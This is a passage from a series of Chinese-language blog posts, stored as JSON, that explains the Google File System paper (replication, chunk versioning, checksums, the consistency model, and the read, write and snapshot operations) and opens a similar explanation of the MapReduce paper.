之间的一致性由写操作来保证（详见上一篇博文），用户可以对 Namespace 上某个节点的 replica 做配置，也就是可以在文件夹和文件两个等级进行配置，这里的配置主要指数量的配置，而 chunk 的具体位置则由 GFS 来决定。论文 4.2 小节中提到，GFS 会将多个 replica 分布在不同的机架（rack）内的机器上，这样做的好处在于，即便因为一些原因导致某个机架直接不可用，GFS 也可以使用其他机架上的 replica 来提供服务。此外，这种分布方式也可以优化客户端的请求，它可以选择一个离自己最近的机器来完成读写操作。但与之相对的，这种分布也意味着客户端做写操作时，网络流量要垮多个机架，这通常是比较慢的，但正如论文 4.2 小节中所说，这是 Google 作出的一种 trade-off。 chunk 的位置并不是不变的，它可能因为 ChunkServer 的负载过高而被迁移到其他机器上，这被叫做 Rebalancing。此外，当 ChunkServer 挂掉或 chunk 的某个 replica 不可用（不可用的原因见下文）时，整个集群中可用的 chunk 就与用户的预期不符（比如用户设置了 3 个副本，但因为有 1 个故障，此时可用的副本数为 2），GFS 也会进行 re-replication，这可能会在其他 ChunkServer 上创建副本。反之，如果集群中的副本数量大于用户的配置，GFS 也会对多余的副本进行删除，这也是一种 re-replication。 这里有一个问题，就是一个 chunk 的所有 replica 是否具有同样的 chunk handle，论文对此并没有给出解释，但我认为在工程上无论是否相同都是可以实现的。而是否相同则会有不同的弊端，如果是相同的，那么用户也许就无法声明大于机器数量的 replica，因为如果机器只有 2 台，而用户声明需要 3 个 replica，那么就一定有一台机器上有两份副本，此时同一台机器上有两个拥有同样 chunk handle 的 chunk，如果不加一个中间层做处理就会有冲突；而如果副本的 chunk handle 是不同的，那么实际可用的 chunk handle 就会变少，因为一个 chunk 的副本就会占用多个 chunk handle。 那么什么情况下 chunk 的副本会变得不可用呢？在 chunk 过期或者损坏的情况。先说过期，这种现象发生在 secondary chunk 所在的 ChunkServer 短暂的宕机后又重启，而在宕机期间，该 chunk 的其他副本发生了写入操作，此时如果 ChunkServer 恢复，那么这个恢复的 chunk 上的数据就和其他机器上的数据不一致，也就是过期了。为了避免这种情况，GFS 提供了版本号的机制，具体来说，Master 为每个 chunk 维护了一个版本号，在发生写入操作时，这个版本号会增加。所以对于一个 chunk 而言，它的每个副本有一个版本号，Master 也有一个对应于这个 chunk 的版本号，通常情况下它们是相同的，而一旦不同，Master 就以集群中最高的那个为基准（Master 上的版本号可能低于 ChunkServer 上记录的，因为 Master 也会宕机），然后删除掉那些旧的 chunk，再 re-replication 出新的 chunk。此外，由于更新操作会有一些延迟，Master 在发送 chunk 的位置信息时也会发送各个副本对应的版本号，这样客户端就可以主动选择最大的那个，避免读取过期的数据。 另一方面，chunk 也可能损坏，这主要表现在磁盘可能会出问题导致保存的数据发生变化，或文件系统在写入数据时也可能发生问题等，总之最终的结果就是 chunk 中保存的数据和用户想要写入的不一致，这也可以被看作是一种 undefind。为了尽可能避免这个问题，GFS 提供了 checksum 的机制，具体而言，一个 64MB 的 chunk 会被分成多个 64KB 的块，每个块有一个对应的 32 位的 checksum。在读取一个 chunk 时，ChunkServer 会对读取的内容重新计算 checksum 并与保存的 checksum 做对比，一旦不一致就会回复一个错误给客户端，此时客户端需要从其他 ChunkServer 上读取这个 chunk，而这个异常也会被通知到 Master，使得它可以对这个 chunk 进行 re-replication。 毫无疑问，这种机制会让 chunk 的读写都受到一定的影响，其中写操作的影响更大一些。由于 Google 内部的追加写操作要远多于随机写，所以 GFS 对追加写操作做了一些优化。先来看普通写，它的作用是“在文件 A 的 X 字节偏移处写入 Y 个字节”，那么写入的这些内容会不同程度地影响 chunk。比如如果写入 64 KB 的内容，那么就可能修改了一个完整的块（这个块是指与一个 32 位的 checksum 对应的块，不是 chunk，下同），也可能修改了两个连续的块，如果写入大于 64 KB 的内容，就可能修改了两个块或三个块，但一定有一个块是被完全覆写的。因此，GFS 的做法是在被修改的所有 chunk 中选择最开始和最后的两个，读取并验证它们的 checksum，如果是正确的才执行写入，否则要先对这两个 chunk 进行 re-replication，然后才能执行写入。之所以要验证首位的两个块，是因为写入操作会重写内部的 checksum，这样即便那些没有被覆写的区域中有数据损坏的问题也不能被发现了。 对于追加写来说，GFS 可以增量地更新当前最后一个块的 checksum，怎么理解这个增量更新呢，比如编程语言中的 md5 计算，会有类似 md5(&quot;1111&quot;).update(&quot;2222&quot;) == md5(&quot;11112222&quot;) 的规则，增量更新指的应该就是这一点。对于当前文件中的最后一个块而言，它只在没有写满 64KB 的情况下才会被追加内容，否则内容会被追加到下一个块中。而在追加操作前，块的 checksum 计算的是 64KB 中已经写入的部分，在追加操作时只需要 update 新写入的部分即可。这时并不需要读取并验证原来的 checksum 是否正确，因为如果写入原来的内容时预期的内容是 1111，而实际写入的是 1112，上面的等式的左边就是 md5(&quot;1111&quot;).update(&quot;2222&quot;)，右边就是 md5(&quot;11122222&quot;)，它们是不相等的。这样在下次对这个块进行读取时就可以发现问题并作出反应了。 除了通过主动读取来验证 checksum，当 ChunkServer 处于一个低负载状态时，它也会扫描自己保存的所有 chunk 上的各个块，判断是否出现 checksum 验证不通过的现象，并将这些信息上报给 Master，Master 也会根据这些信息进行 re-replication，从而保证集群中的数据完整。 总结到此为止，我想讨论的 GFS 相关的内容就结束了。为了更好地理解 GFS 的内部机制，我找到了一个 GFS 的简单实现，用 golang 语言开发，在此也把它分享给各位。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析 Google File System（二）","slug":"GFS2","date":"2022-07-05T14:02:03.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/07/05/GFS2/","link":"","permalink":"/2022/07/05/GFS2/","excerpt":"","text":"论文下载 前言上一篇博客中讨论了 GFS 的部分操作接口，主要聚焦在 Master 和 Client 上。但是对于一个文件系统而言，文件的存储才是其核心的能力，本文将讨论 GFS 的读写接口，包括读写文件的流程以及一致性模型。虽然 GFS 作为一个分布式的文件系统，仅实现了一个非常宽松的一致性模型，但却足以支撑 Google 内部的一些业务。此外，GFS 的一些错误处理在下一篇文章中继续讨论。 GFS 的一致性模型在讨论读写操作前，首先要先介绍一下 GFS 的一致性模型。这里的一致性指 ChunkServer 上的一致性，关于 Master 的一致性在后面的内容中会涉及。 GFS 定义了两个词，一致的（consistent）和确定的（defined）。具体来说，同一个 chunk 可能会被保存多份，那么如果这些副本中的内容相同，就说这是一致的；而如果用户向 chunk 中写入了内容，然后读取时发现内容和写入的一样，就说这是确定的。 一致的比较好理解，但为什么会有不确定的现象呢。这主要在于 GFS 在同一时间可能被多个用户访问，如果用户 A 向 chunk1 中写入内容，那么在他执行读取操作前， chunk1 中的内容是有可能被用户 B 修改的，所以用户 A 读取出来的内容就和写入不一样，也就是不确定。另外，如果用户 A 和用户 B 同时向两个 chunk 中写入内容，也就是 128MB 大小的数据，也可能会出现第一个 chunk 是用户 A 写入的内容，第二个 chunk 是用户 B 写入的内容的情况，或者反过来，这也是不确定的。 对于 write 和 record append 两个操作，GFS 提供了不同的一致性保证，具体如下表所示： write record append 顺序访问 defined 且 consistent defined 但是有一些 inconsistent 的内容 并发访问 undefined 且 consistent defined 但是有一些 inconsistent 的内容 写入失败 inconsistent inconsistent 光看这张表的话不是很容易理解，下面我们分别针对不同的操作来具体讨论。 write 操作对于一个 chunk 而言，它可能会有多个 replica，分布式系统应该保证 replica 的内容是一致的，这被 GFS 称之为 consistent。从表中 write 的部分可以看到，只要写入成功，那么 GFS 的状态一定是 consistent 的，通常而言，这种一致性需要一个协调者来实现。 GFS 把这个协调者的任务交给 replica 的其中一个，具体交给谁呢，这取决于 GFS 把租约（lease）下发给谁，拿到租约的 replica 被称为 primary，而其余的 replica 被称为 secondary。按照我的理解，租约可以看作是带时间限制的锁，GFS 把这个时间限制设为 60 秒，这意味着如果一个 replica 拿到了租约，那么通常它在其后的 60 秒内会作为 primary，然后负责协调并发写入时的顺序。为什么说通常是 60 秒呢，因为租约既可以被续租，也可以被提前回收。比如前面提到的 snapshot 操作，就需要回收被复制的目录及其内部所有文件的租约，避免在创建快照的途中发生写入操作造成混乱。 论文 3.1 小节详细描述了 GFS 读写文件的流程，但是我觉得有一些遗漏。文中以客户端询问 Master 某个 chunk 及其 replica 的位置作为流程的第一步，我认为作为一个文件系统，客户端应该处理的是“在文件 A 的第 X 字节偏移处写入 Y 个字节”这样的语义。所以整个流程的第一步应该是客户端根据 X 的值算出 chunk 的下标和写入位置在 chunk 上的偏移量，由于 chunk 固定为 64 MB，所以这很容易。这样以后，客户端需要的信息就是“文件 A 的第 Z 个 chunk 在哪里”，而这正是 Master 可以提供的服务。 Master 在返回客户端结果时需要告诉它哪个 replica 是 primary，所以如果此时还没有 primary，那么 Master 会先下发一个租约给某个 chunk，然后再把信息返回给客户端。客户端拿到这些信息后会将它们缓存在本地，下次查询相同的信息时就可以避免再与 Master 交互。3.1 小节中提到客户端仅在 primary 不可访问或它不再拥有租约时才会再次向 Master 获取这些信息，但是 2.4 小节中提到客户端缓存的信息会过期，或 reopen 文件时被清空，所以在这些情况下，客户端同样需要访问 Master 来获取 chunk 的位置信息。 确定了 primary 和其他 replica 的位置后，客户端就可以向它们所在的 ChunkServer 推送数据了。GFS 采用了一种流水线式的传输，即客户端会将数据传输给离它最近的 ChunkServer，而这个 ChunkServer 在接收数据的同时又会将数据发送给另一个 ChunkServer，以此类推，最终达到的效果就是客户端仅需要与一个 ChunkServer 交互，就可以将数据推送给所有与本次传输相关的 ChunkServer。从这里也可以得知，ChunkServer 是有能力知道它上面的某个 chunk 的其他 replica 在哪个 ChunkServer 上的，这可能是客户端在发送数据前告知它的，也可能是它查询了 Master，不论是哪种方式，都需要保证数据传输时不会出现环路，即 A 发给 B，B 发给 C，C 发给 A 的情况。 ChunkServer 收到来自客户端或其他 ChunkServer 的数据后，会将它们先放在一个内部的 LRU 缓存里，论文中没有解释为什么要用 LRU，根据这种缓存的性质来推测，可能是想尽可能保证热点数据被写入。因为只有缓存中的数据才有机会被写入到 chunk 中，而机器的内存是有限的，所以要尽可能把那些热点的数据放在缓存里，这样即便内存不足，被逐出缓存的也只是那些相对较冷的数据。 当所有相关的 ChunkServer 都收到了数据后，客户端会发送一个写请求给 primary，这个请求中标识了刚刚传输的数据，也就是可以从前文提到的 LRU 缓存中找出对应的内容。primary 会决定一个执行写入的顺序，然后按这个顺序将 LRU 缓存中的内容写入到对应的 chunk 中，成功后会将这个请求转发给其他的 replica，让它们也将缓存中的内容持久化到 chunk 里。primary 给写入请求做了编号，来保证其他 replica 的写入顺序和自己是一致的，而只要写入顺序是相同的，那么一旦写入成功，最终 chunk 的状态就是一致的，也就是所谓的 consistent。当 primary 收到所有其他 replica 写入成功的消息，它就会回复客户端写入成功。 这是比较理想的情况，现实里也会存在写入失败的情况，比如可能 LRU 缓存中的内容已经被逐出，那么客户端发送写请求到 primary 时，它就不能根据里面的标识在缓存中找到对应的数据。此外，写入 chunk 时也可能会遇到问题。如果上述操作中的任意环节出现问题，客户端都会认为写入失败。这时 chunk 的内容是不确定的，大概率是不一致的，也就是表中的 inconsistent，GFS 对于这种情况的处理相当简单粗暴，就是重试。 record append 操作record append 操作和 write 操作的流程大体类似，论文 3.3 小节中对此作出了一些描述。在机制上，record append 操作和 write 操作的主要区别在于，追加时的文件偏移是由 GFS 决定的，而 write 操作的偏移是由用户决定的。除此之外，追加写入的内容最大只能是 16 MB，原因见下文。 根据 3.3 中的内容，可以推测客户端会询问 Master 类似“文件 A 的最后一个 chunk 在哪”这样的问题，然后 Master 做和上文所述的同样的操作（也就是下发租约，返回结果）。然后客户端将数据以流水线的形式推送到各个相关的 ChunkServer 上，然后对 primary 发送写请求。这时，如果 primary 发现当前的 chunk 中剩余的空间不足以写入追加的内容，那么会将剩余的空间填充（pad），然后让其余的 replica 也做同样的操作，结束后返回客户端失败，并让它在下一个 chunk 上重试。反之，如果当前 chunk 中剩余的空间可以容纳追加的内容，那么就执行正常的写入流程并保证一致性（即在同样的偏移处写入同样的内容，如果因为上一个 record append 操作失败导致 primary 上 chunk 最后的位置是 X，其他 replica 最后的位置是 Y，那么写入时以 X 为准），再返回客户端文件内容在 chunk 上的偏移。由于追加内容最大是 16 MB，所以用于填充剩余空间的部分不会超过 16 MB，也就是说每个 chunk 最多浪费 16 MB 的空间。 这个流程中可能让人疑惑的点在于为什么客户端要先将数据推送到 ChunkServer 上，再由 ChunkServer 决定是否可以执行写入呢？如果 ChunkServer 决定不能写入，那么刚刚推送的数据就没有任何意义。为什么不先询问 ChunkServer 是否有足够的空间，再决定是否推送数据呢？原因在于，即便先查询的结果是有足够的空间，在传输数据后执行写入时也可能没有足够的空间，因为这中间隔了非常久的时间，而追加操作又是多个客户端并发的，所以在这个时间间隔内可能其他的客户端已经完成了追加操作占满了 chunk 的空间。 那是否可以让 ChunkServer 为某个客户端预留一块空间，或者让 Master 参与协调将多个客户端的追加操作调度一下呢？这也不行，一方面会增加系统的复杂度，另一方面，即便 GFS 为某个客户端预留了一块空间，客户端也完全可以选择不向里面写入数据，而这块空间又不能被其他客户端使用，这样 chunk 的空间就浪费了。 从上面的描述中可以发现，GFS 处理 record append 的写入错误也同样使用重试，只不过由于 record append 是在文件的最后一个 chunk 的末尾写入数据，所以第二次重试时写入的位置和第一次已经不一样了。那么多次重试直到某次写入成功，此时整个文件中至少有一个 chunk handle 对应的 chunk，它的某个位置上拥有完整的追加内容，且其他 replica 在这个位置上也有同样的完整的内容。而与之相对，此前的失败追加也会在 chunk 中留下各种不一致的内容，但 GFS 本身保证的就是至少一次的原子追加，所以这些不一致是可以容忍的。 总结来看，record append 中成功的操作会在 chunk 的某个位置上留下完整的内容，且这个内容不会因为其他客户端的并发 record append 操作而被覆盖掉，也就是所谓的确定的（defined），但失败的操作也会在 chunk 中留下一些不一致的内容，也就是所谓的 inconsistent。这就是前文的表中所描述的内容了。 read 操作相较于写入，read 操作就显得非常简单了。首先，客户端想知道“文件 A 的 X～Y 字节偏移处的内容”，那么由于一个 chunk 的大小是固定的 64 MB，客户端就可以根据这个需求计算出 chunk 的下标，然后用文件名和下标来向 Master 查询位置信息。为了减少 IO 的消耗，客户端向 Master 发送的一次请求中可以询问多个 chunk 的信息。 客户端拿到这个信息后，同样会将它缓存在本地，缓存的过期条件和之前的描述是一样的。客户端寻找一个离它最近的 ChunkServer，然后从那里读取 chunk 中的内容。从上面对 write 操作和 record append 操作的描述中可以得知，chunk 中是存在不一致的内容的，不过这对 Google 而言不是什么问题，因为他们随机读的需求也比较少，像之前讨论的 MapReduce 就是读取了完整的文件，而由于 GFS 的“至少一次”的一致性保证，MapReduce 最终也一定会读取到它需要的内容。 但是在读取时，整个流程也需要配合 GFS 的错误处理机制，比如前面讨论 record append 时，可以得知文件中会有一些被 GFS 填充的空内容，那么读取时就应该跳过这些内容（可能是按需跳过）。除此之外，由于写入时有可能发生错误（比如比特反转），GFS 在读取时在一定程度上也可以识别到这种错误并作出合理的反应，具体要怎么做就放在下一篇博客中吧。","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析 Google File System（一）","slug":"GFS1","date":"2022-07-03T14:02:03.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/07/03/GFS1/","link":"","permalink":"/2022/07/03/GFS1/","excerpt":"","text":"论文下载 前言继续拜读三驾马车，最近阅读了 GFS 的论文。这篇于 2003 年被收录在 SOSP 上的论文描述了一个工作在上千台机器的集群上的文件系统，其设计影响了后续很多项目，比如 HDFS 就是它的一种开源实现。我没有参与那个年代的技术变革，但是看了很多对这篇论文的评价，大家的观点基本是一样的，即，GFS 在技术上并没有什么创新点，它只是非常好地做了 trade-off，并以一种非常简单的设计做出了适合 Google 内部需求的强大系统。 于是这篇文章就用来记录一些我的读后总结，欢迎一起交流:-) 概述GFS 的使用者是 Google 内部的一些应用（比如之前的 MapReduce），所以其设计就需要满足内部的需求。论文的第 1 节和第 2.1 节中都有一些需求上的描述，具体来说包括以下几点：1）GFS 应该工作在由很多常规设备组建的集群上，这意味着需要把“设备会出错”作为一种必然事件来对待；2）操作的文件都是大文件，通常有几个 GB 大小，所以 GFS 在大文件的处理上要优于小文件；3）在写入文件时，追加操作是非常频繁的，几乎没有随机写操作，所以 GFS 对追加写操作做了一些优化，并且也相对更强调它的一致性。 在设计上，GFS 中包括三个组件，分别是 Master、ChunkServer 和 Client，其中 Master 和 ChunkServer 都是用户态的程序，而 Client 以库的形式被业务代码使用。 下面简单介绍下这三个组件，更详细的内容见后文。 Client 负责根据业务代码的需求发送请求与 Master 和 ChunkServer 交互，从而完成各项操作，为了优化性能，它还会缓存一些信息在本地； ChunkServer 负责实际的文件存储，它管理的基本单元就是 Chunk，一个完整的文件会被拆分成多个 Chunk，并被存储在 ChunkServer 上。为了更好地容错，每个 Chunk 都会保存多份，这些 replica 被分布在不同的 ChunkServer 上，其数量可以由用户指定。Chunk 在被创建时会被分配一个全局唯一的 Chunk handle 作为标识，这个标识有 64bit 大小，客户端可以使用它向某个 ChunkServer 索要数据。在表现上，每个 Chunk 都是一个按需动态扩展大小的文件（最大 64MB），也就是说 GFS 直接使用了 Linux 的文件系统来提供存储能力，而由于 Linux 在读取文件时自带缓存，所以 GFS 并没有实现自己的缓存； Client 在读取文件时是只知道文件名的，那它如何知道文件对应的 Chunk 是哪些，而这些 Chunk 又在哪台 ChunkServer 上呢？这就要通过 Master 了，具体而言，Master 中保存了所有文件到 Chunk 的映射，以及 Chunk 的具体位置，Client 在读写文件时首先通过 Master 来获知对应的 Chunk 和其位置，然后就直接与对应的 ChunkServer 进行交互了，Master 在这里只是起到类似索引的作用。而除了这个功能，Master 还负责锁管理、垃圾回收、过期 Chunk 检测等功能。 操作接口论文 2.2 小节中提到，GFS 并没有实现类似 POSIX 标准的文件系统接口，它支持的操作有 create、delete、open、close、read、write、snapshot、record append。除了这些操作外，根据后文的描述以及之前对 MapReduce 的解读，还可以推知 GFS 也支持 rename 操作。根据我的理解，这些操作可以被划分为三组，具体见下表： 组编号 操作 主要被操作的组件 1 open/close Client 2 create/delete/snapshot/rename Master 3 read/write/record append ChunkServer 为什么这样区分呢？且听我细细道来。 第1组对于 open/close 操作，论文中并没有过多的提及，但我们前面提到为了优化性能，Client 会缓存一些信息。比如在读取时，它会通过 Master 查询“文件 A 的第 X 个 Chunk 在哪”这样的信息，并以文件名+Chunk下标作为键进行缓存，缓存的过期方式有两个，其一是达到了设置的过期时间，其二就是重新打开这个文件。对于重新打开文件这一点，论文 2.7.1 节中的描述是 which purges from the cache all chunk information for that file。基于这一点，我推测文件的打开和关闭操作主要影响的是客户端，比如 open 操作用于在客户端建立对应文件的缓存结构，而 close 操作将这个结构释放掉。 我没有在论文中找到类似排他打开的操作，如果 GFS 支持这种操作，那么 open/close 必然要通知到 Master。与之类似的，如果 GFS 可以避免文件在打开时被删除，那么这两个操作也同样需要被通知到 Master。 第2组我们前面提到，Master 中保存了文件到 Chunk 的映射。这里所谓的文件，其实就是 /x/y/z 这样的一个字符串，GFS 并没有常规文件系统中的目录的结构（这种结构中记录了目录中的内容），所以我认为在实现上Master 的这种映射关系保存成 kv 存储也没问题，但是出于减小体积、加快查找速度、方便恢复（详见后文）等方面的考虑，GFS 将文件路径组织成树状结构，并称其为 Namespace。在这棵树上的每个节点都有一对锁，分别是 read 锁与 write 锁，两种锁相互配合来避免并发的操作导致 Namespace 的混乱。这里的操作指什么呢，主要指的就是第二组中的内容。 create 操作顾名思义，create 用于在 Namespace 中建立一个新的节点，论文中没有提到 create 的流程，但我认为如果仅仅是 create 文件，那并不需要立即为其创建一个 chunk，可以把 chunk 的创建延迟到到对这个文件执行写入时。前面提到 Namespace 中的每个节点都有一对锁，在 create 一个新节点时这对锁也会参与进来。具体来说，假设我们要创建 /home/hygao/file1，那么在创建的过程中 /home、/home/hygao 都会被加上 read 锁，而 /home/hygao/file1 会被加上 write 锁。这意味着，我们可以同时创建 /home/hygao/file2，因为 /home 和 /home/hygao 都是 read 锁，而 read 锁之间并不冲突，但我们不能同时创建 /home/hygao/file1，因为 /home/hygao/file1 已经被上了 write 锁，write 锁之间是相互冲突的。 delete 操作论文中重点介绍了删除文件的场景，但没怎么提及删除目录的场景（从论文 4.1 小节中可以推断出 GFS 是支持删除目录的），所以这里仅讨论删除文件的相关内容。GFS 的 delete 包括 Master 中元数据的删除以及对应 Chunk 的删除，整个过程需要和 Master 的垃圾回收功能相配合。 具体而言，当用户申请删除一个文件时，GFS 将这个文件 rename 为一个隐藏名（其实个人电脑的回收站也是这个原理），这个隐藏名中记录了删除时的时间戳。GFS 会定期扫描 Namespace，所以它可以知道这些被标记为“应该删除”的文件已经在“回收站”中保存了多久，而用户可以配置一个最大保存时间，超过这个时间的“应该删除”的文件就会真的执行删除，在此之前，用户可以通过将这些文件 rename 成普通文件的方式来避免它们被删除。所谓”真的执行删除“，就是将这个节点从 Namespace 中移除掉，这样该文件对应的 Chunk 就变成了孤儿（orphaned chunk），即没有任何一个文件引用它们，此时 Master 就可以向对应的 ChunkServer 发送指令，让它们删除掉对应的 chunk，从而释放硬盘空间。 这种机制的好处在于删除操作会非常快速（因为仅涉及 namespace 的操作），且误删时在一定时间内还可以将其快速恢复。与之相对的，坏处在于所谓的删除其实并没有立即释放出硬盘的空间，这在空间吃紧的情况下是非常无力的。如何解决这个问题呢？根据论文的描述，如果用户重复删除同一个文件，那么垃圾回收会被加速；此外，用户可以指定一个节点的删除策略，这样在用户执行 delete 时文件就会被立即删除并释放空间，这样的删除不可恢复，而这里提到的节点，其实就代表可以在目录和文件两个维度进行配置。 其实根据上面的描述，可以推测出还有第三种加速删除的方式，因为 GFS 判断文件在“回收站”里保存了多久是根据文件名中的时间戳，而用户首先可以访问这些文件，其次可以对其 rename，那只要修改掉文件中的时间戳，让 GFS 认为这个文件已经被保存很久了，就可以在下次垃圾回收时将它清理掉了:-P 此外由于在对文件操作时（比如后面的 snapshot）不能将其删除，所以可以推测 delete 也会给文件加上 write 锁。 snapshot 操作根据我的理解，snapshot 操作应该类似于个人电脑上对文件或文件夹的复制，复制后的文件或目录拥有与复制源相同的内容，但对复制后的内容的修改不会影响到复制源。GFS 支持目录和文件两个级别的 snapshot，不过论文中只介绍了文件级别的流程，所以这里也同样仅讨论文件的 snapshot 操作。GFS 对这个操作做了一些优化，具体包括 CoW 和本地复制。 CoW 也就是 copy-on-write，这项技术旨在尽可能复用已有的内容。在 GFS 的场景下，表现为当用户执行 snapshot 时，新的文件对应的 chunk 同样使用源文件的 chunk。也就是说，如果有文件 /file1，其对应的 chunk 为 A、B、C，那么对其执行 snapshot 创建文件 /file2 时，这个新文件对应的 chunk 同样是 A、B、C。由于 snapshot 出的新文件本身就拥有和源文件同样的内容，所以在用户对新文件执行 read 操作时不会感受到有什么问题。 但是写文件时就不一样了，如前所述，对新文件的修改不会影响到源文件，这要怎么做呢？就是 CoW，即用户对文件对应的某个 chunk 执行写入时，Master 会让 ChunkServer 复制一个新的 chunk 出来，并为其分配 chunk handle，再把这个新的 chunk handle 返回给客户端，此后客户端的写入请求都在这个新的 chunk 上生效，从而避免了对源 chunk 的影响。这里 Master 会认为需要创建一个新的 Chunk，是因为每个 Chunk 保存了一个引用计数，如果它大于 1，那么就说明需要创建新的 Chunk，创建后会将源 Chunk 的引用计数减一，因为此时被读取的文件已经引用了新的 Chunk。 那么本地复制指的是什么呢，其实这是我自己起的名字:-P。它实际表示的是，Master 在创建新的 chunk 时，会让源 chunk 所在的 ChunkServer 来创建这个新的 chunk，这样的好处在于 chunk 的复制不需要走网络，相关的 IO 都仅发生在磁盘上，根据论文，Google 的磁盘读写速度差不多是网络的 3 倍。但是这也会有一个问题，就是如果源 ChunkServer 上的磁盘容量不足以创建这个新的 chunk 该怎么办，我不清楚文件系统会不会对此做什么优化，不过论文中并没有对这种情况作出说明。 最后，根据 4.1 小节，snapshot 会给文件加上 write 锁，从而避免 snapshot 的过程中发生删除、创建新文件等。 rename 操作论文中并没有描述 rename 的流程，但是从 MapReduce 以及文中的一些描述我们可以推断 GFS 是支持这个操作的，而且这个操作是原子的。根据这一点，我推测 rename 操作会给源文件与目标文件加 write 锁。 而 rename 的原理应该就是节点内容的迁移，比如把 /file1 文件 rename 成 /file2，就是把 /file1 对应的 chunk 给 /file2，然后删除 /file1 这条记录，这个操作只涉及 Master，不会对 ChunkServer 产生影响。这里的删除指的是从 Namespace 中直接删掉，而不是前面提到的 delete 操作。 第 3 组最后一组就是最重要的操作了，因为它主要与 ChunkServer 进行交互，也就是完成对文件的读写，这是一个文件系统的核心能力。虽然这是 GFS 中最有趣的部分，但是为了避免这篇文章太长，所以这部分以及后续的内容就放在下一篇文章中来讨论吧:-)","categories":[{"name":"分布式","slug":"分布式","permalink":"/categories/分布式/"},{"name":"论文","slug":"论文","permalink":"/categories/论文/"},{"name":"存储","slug":"存储","permalink":"/categories/存储/"}],"tags":[]},{"title":"浅析批处理框架 MapReduce","slug":"MapReduce","date":"2022-06-22T18:44:06.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2022/06/23/MapReduce/","link":"","permalink":"/2022/06/23/MapReduce/","excerpt":"","text":"论文下载 前言最近拜读了 Google 三驾马车中的 MapReduce，这个被发布在 2004 年的论文中介绍了一个工作在分布式文件系统 GFS 之上的“批处理”框架。尽管由于各种原因， Google 在很久前就声称内部不再使用 MapReduce 了，但因为这个框架非常经典，以及当前依然有很多系统将它作为执行引擎（比如一些框架在 MapReduce 上添加 DSL 来做声明式系统），我认为研究这个框架仍然具有很大的意义。 概述MapReduce 非常有趣的一点在于，它试图为使用者屏蔽掉分布式带来的大多数问题（没有完全屏蔽，因为 Partition 函数或 Combiner 函数都要求用户对任务在节点上的分布有一个明确的感知），诸如拆分输入、并行执行、错误处理、节点通信等底层的问题都由框架来处理。在使用上，它要求用户至少提供一个 Map 任务和一个 Reduce 任务，通常而言，Map 用于处理并行任务，而 Reduce 则将 Map 的输出进行聚合并产生最终的输出。 框架会将这些任务分配给集群中的多个节点来做分布式的执行。这里借用论文中提供的执行说明图，来简单阐述下框架的执行过程（结合论文 Appendix A 中的代码来看这幅图会更好一些，但由于篇幅原因，这里就不把相应的内容贴过来了）： 首先，对于一个任务而言，集群中存在 master 和 worker 两类节点（为了方便描述，这里将“分配到 master 程序的节点”称为 master 节点，worker 同理），顾名思义，master 负责协调任务的执行，worker 则是干活的。从论文提供的代码中可以看到，worker 的数量可以通过 spec.set_machines(&lt;数量&gt;) 来设置，不过注释中提到这里是设置“最多使用的机器数量”。与之相对的，master 则只有一个。 用户要做的任务是定义 Map 和 Reduce，然后声明输入文件和输出文件的名字，根据论文提供的代码，用户可以通过 out-&gt;set_filebase(&lt;前缀&gt;) 声明输出文件的前缀，比如 out-&gt;set_filebase(&quot;/gfs/test/freq&quot;)，而输出文件剩余的部分取决于 reduce 的数量，因为一个 reduce 对应一个输出文件。如果有 100 个 reduce，那么最终就会生成 /gfs/test/freq-00000-of-00100、/gfs/test/freq-00001-of-00100 这样的文件。不过不清楚为什么要从 0 开始，如果这样那么最后一个文件的名字可能就是 /gfs/test/freq-00099-of-00100，看起来怪怪的。 当用户定义了 Map 和 Reduce 任务后，master 会给 worker 分配任务，由于通常而言 map 和 reduce 的数量和都是大于 worker 的数量的，所以一个 worker 可能会被分配到多个任务。那么 map 和 reduce 的数量是如何确定的呢？对于 map 而言，数量是自动确定的。框架会把输入文件拆分成 16～64 MB 的一个个输入块（split），每个块的具体大小由用户控制。这样一来，只要知道输入文件的大小，就可以知道需要被分割成多少个输入块，而由于一个 map 任务处理一个输入块，所以 map 任务的数量也就知道了；与之相对的，reduce 任务的数量则由用户通过 out-&gt;set_num_tasks(&lt;数量&gt;) 自己定义。 Map 任务读取输入，根据配置好的规则将输入解析成一个一个的 Key-Value pair，然后用这个 k-v pair 作为入参调用用户提供的代码来产生输出，输出同样以 k-v pair 的形式表示，首先会被写入到内存中，然后由框架周期性地将这些结果写入到本地磁盘（注意和 GFS 的全局存储区分开）中。在写入的过程中会调用用户提供的分区函数对输出进行分区，比如 hash(Key) % &lt;Reduce 任务的数量&gt;，因此一个 map 任务可能会产生很多分区。map 任务产生的这些文件对应的位置会上报给 master 节点，然后 master 节点会将各个分区文件的位置发给对应的 reduce 任务。 当 reduce 任务收到 master 节点的通知时，它会通过 RPC 来从各个 map 任务那里拉取属于自己分区的文件。而当 reduce 任务拉取到所有的文件时，它会对这些文件中的 k-v pair 做排序，排序的结果使得所有具有相同 key 的 value 被聚合在一起，而 key 本身则也根据其语义被排序。对于排序本身而言，根据内存中是否能容纳所有的数据，reduce 任务会按需使用硬盘做辅助空间进行外部排序。 经过这样的处理后，框架会遍历排好序的结果，依次为其调用用户提供的 reduce 代码。代码接受一个 key 和一个迭代器作为参数，迭代器中的内容是属于这个 key 的所有 value，之所以要使用迭代器而不是一个简单的列表，是为了避免一个 key 中的所有 value 的数量过大，导致内存不能将其容纳进来。迭代器屏蔽了数据的来源，不管数据是来自于内存还是硬盘，在代码层面的处理都是相同的。 当分区中所有的内容都被用户提供的 reduce 任务处理后，就会在前文所述的输出文件中产生处理后的结果。而到此为止，整个 MapReduce 任务就结束了。 细节前面描述了一次 MapReduce 任务的大概流程，在这个基础上，依然有一些细节问题值得探讨，下面按发生的顺序来一一阐述。 首先，Google 的 MapReduce 是运行在 GFS 集群上的，作为一个分布式的文件系统，GFS 将文件按 64 MB拆分成几个小块，并存储在不同的机器上，而这些机器很可能就被作为了 MapReduce 的 worker。这就给了框架进行优化的空间，具体来说，master 可以通过 GFS 获知到输入文件的布局，比如节点 